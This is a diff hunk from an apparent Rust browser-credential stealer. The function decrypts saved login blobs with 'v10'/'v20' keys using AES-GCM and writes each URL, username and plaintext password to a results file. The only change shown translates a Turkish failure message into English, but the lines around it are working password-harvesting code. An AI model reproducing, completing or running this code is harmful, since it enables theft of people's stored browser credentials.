@@ -249,7 +249,7 @@ fn do_work() -> Result<(), Box<dyn std::error::Error>> {
                                 if blob.len() > 15 {
                                     let key = if blob.starts_with(b"v20") { &v20_key } else { &v10_key };
                                     if !key.is_empty() {
-                                        let dec = aes_gcm_decrypt(key, &blob).unwrap_or_else(|_| b"[Çözme Başarısız]".to_vec());
+                                        let dec = aes_gcm_decrypt(key, &blob).unwrap_or_else(|_| b"[Decryption Failed]".to_vec());
                                         let _ = writeln!(results_file, "URL: {}\nUser: {}\nPass: {}\n", url, user, String::from_utf8_lossy(&dec));
                                     }
                                 }
